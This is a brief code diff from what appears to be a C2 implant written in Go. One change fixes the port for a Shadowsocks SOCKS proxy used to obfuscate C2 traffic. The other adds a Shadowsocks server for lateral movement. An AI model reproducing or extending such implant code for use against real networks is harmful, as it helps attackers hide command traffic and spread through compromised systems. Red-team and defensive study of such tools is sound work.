@@ -319,7 +319,7 @@ test_agent:
 	if agent.RuntimeConfig.UseShadowsocks {
 		// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
 		agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
-			agent.RuntimeConfig.ShadowsocksPort)
+			agent.RuntimeConfig.ShadowsocksLocalSocksPort)
 
 		// run ss w/wo KCP
 		go agent.ShadowsocksC2Client()
@@ -365,6 +365,7 @@ test_agent:
 		}
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
+	go agent.ShadowsocksServer() // start shadowsocks server for lateral movement
 
 connect:
 	// apply whatever proxy setting we have just added
